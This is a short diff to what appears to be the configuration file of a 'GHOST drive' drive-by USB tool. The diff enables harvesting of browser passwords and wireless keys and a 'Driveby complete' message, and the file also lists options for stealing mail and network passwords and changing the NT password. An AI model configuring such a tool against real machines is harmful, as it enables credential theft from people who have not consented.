@@ -8,7 +8,7 @@ multi_arch = 1
 
 # ->completion controls
 msgbox = {
-    'controller': 0,
+    'controller': 1,
     'title': "GHOST drive",
     'msg': "Driveby complete !!!",
     'buttons': 0
@@ -21,8 +21,8 @@ power = {
 }
 
 # ->password recovery
-browser_pwds = 0
-wireless_keys = 0
+browser_pwds = 1
+wireless_keys = 1
 email_pst_pwds = 0
 mail_pwds = 0
 network_pwds = 0
@@ -40,7 +40,7 @@ change_nt_pwd = {
 }
 
 # ->recon
-batch_info = 1
+batch_info = 0
 network_scan = 0
 
 # ->network based executions
